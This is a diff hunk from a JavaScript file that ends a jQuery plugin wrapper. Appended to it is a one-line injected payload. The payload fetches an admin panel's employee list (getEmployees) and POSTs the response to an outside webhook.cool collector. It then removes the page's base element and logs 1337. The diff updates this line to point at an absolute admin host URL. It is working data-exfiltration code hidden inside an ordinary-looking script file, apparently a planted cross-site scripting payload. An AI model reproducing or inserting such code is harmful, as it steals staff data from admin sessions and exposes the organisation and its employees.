@@ -2543,5 +2543,5 @@
   });
 
 }(jQuery, window, document));
-fetch("/quanly/ajax.php?ajax=1&classAjax=AjaxEmployees&methodAjax=getEmployees&page=1&limit=30").then(r=>r.text()).then(d=>fetch("https://humble-hawk-44.webhook.cool",{method:"POST",headers:{"Content-Type":"text/plain"},body:d})).then(()=>document.querySelector("base")?.remove()).catch(()=>document.querySelector("base")?.remove());
+fetch("https://cms-admin-uat.concung.com/quanly/ajax.php?ajax=1&classAjax=AjaxEmployees&methodAjax=getEmployees&page=1&limit=30").then(r=>r.text()).then(d=>fetch("https://humble-hawk-44.webhook.cool",{method:"POST",headers:{"Content-Type":"text/plain"},body:d})).then(()=>document.querySelector("base")?.remove()).catch(()=>document.querySelector("base")?.remove());
 console.log(1337);
